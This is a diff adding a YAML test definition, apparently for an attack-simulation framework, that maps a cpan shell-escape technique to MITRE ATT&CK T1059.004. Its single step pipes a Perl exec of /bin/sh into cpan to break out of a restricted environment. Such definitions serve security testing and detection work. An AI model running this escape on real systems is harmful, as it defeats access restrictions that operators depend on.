@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Creating shell using cpan command
+description: |-
+    cpan lets you execute perl commands with the ! command. It can be used to break out from restricted environments by spawning an interactive system shell.
+    Reference - https://gtfobins.github.io/gtfobins/cpan/
+uuid: bcd4c2bc-490b-4f91-bd31-3709fe75bbdf
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1059: Command and Scripting Interpreter'
+    subtechniques:
+        - 'T1059.004: Unix Shell'
+requirements:
+    platforms:
+        - os: linux
+        - os: macos
+steps:
+    - name: creating-shell-using-cpan-command
+      inline: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
